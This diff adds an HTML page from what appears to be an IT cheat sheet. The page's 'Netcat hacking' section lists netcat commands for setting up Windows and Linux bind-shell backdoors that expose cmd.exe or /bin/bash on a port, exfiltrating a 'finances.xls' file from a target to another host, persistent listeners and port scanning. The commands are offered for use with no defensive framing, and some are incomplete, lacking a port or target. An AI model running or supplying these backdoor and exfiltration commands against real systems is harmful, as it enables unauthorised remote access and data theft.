@@ -1,0 +1,94 @@
+<!DOCTYPE HTML>
+
+<!--Converted with LaTeX2HTML 2019.2 (Released June 5, 2019) -->
+<HTML lang="EN">
+<HEAD>
+<TITLE>Netcat hacking</TITLE>
+<META NAME="description" CONTENT="Netcat hacking">
+<META NAME="keywords" CONTENT="itcheatsheetv4">
+<META NAME="resource-type" CONTENT="document">
+<META NAME="distribution" CONTENT="global">
+
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
+<META NAME="viewport" CONTENT="width=device-width, initial-scale=1.0">
+<META NAME="Generator" CONTENT="LaTeX2HTML v2019.2">
+
+<LINK REL="STYLESHEET" HREF="itcheatsheetv4.css">
+
+<LINK REL="next" HREF="node19.html">
+<LINK REL="previous" HREF="node17.html">
+<LINK REL="next" HREF="node19.html">
+</HEAD>
+
+<BODY >
+
+<DIV CLASS="navigation"><!--Navigation Panel-->
+<A
+ HREF="node19.html">
+<IMG WIDTH="37" HEIGHT="24" ALT="next" SRC="next.png"></A> 
+<A
+ HREF="node17.html">
+<IMG WIDTH="26" HEIGHT="24" ALT="up" SRC="up.png"></A> 
+<A
+ HREF="node17.html">
+<IMG WIDTH="63" HEIGHT="24" ALT="previous" SRC="prev.png"></A> 
+<A ID="tex2html124"
+  HREF="node1.html">
+<IMG WIDTH="65" HEIGHT="24" ALT="contents" SRC="contents.png"></A>  
+<BR>
+<B> Next:</B> <A
+ HREF="node19.html">NMap</A>
+<B> Up:</B> <A
+ HREF="node17.html">Hacking</A>
+<B> Previous:</B> <A
+ HREF="node17.html">Hacking</A>
+ &nbsp; <B>  <A ID="tex2html125"
+  HREF="node1.html">Contents</A></B> 
+<BR>
+<BR></DIV>
+<!--End of Navigation Panel-->
+
+<H2><A ID="SECTION00071000000000000000">
+Netcat hacking</A>
+</H2>
+<PRE>
+Listen for inbound connections:
+
+nc -l -p 
+Connect to another machine:
+
+nc options host  
+Connect to webserver:
+
+nc 192.168.1.105 80
+HEAD / HTTP/1.0 
+Listen for connections:
+
+nc -l -p 6996
+
+On windows use same command with upper case L to create a 
+persistent listener that survives a reboot
+Create a backdoor:
+For windows:
+
+nc -l -p 6996 -e cmd.exe 
+ nc -nnvl -p 80 -e c:\windows\system32\cmd.exe
+
+For Linux:
+nc -l -p 6996 -e /bin/bash
+Exfiltrate files from target:
+On source system:
+
+type finances.xls | nc 192.168.1.104 6996
+
+On destination system
+nc -l -p 6996 &gt; finances.xls
+Scan targets ip addresses for open ports:
+nc -nv -w1
+</PRE>
+
+<P>
+<BR><HR>
+
+</BODY>
+</HTML>
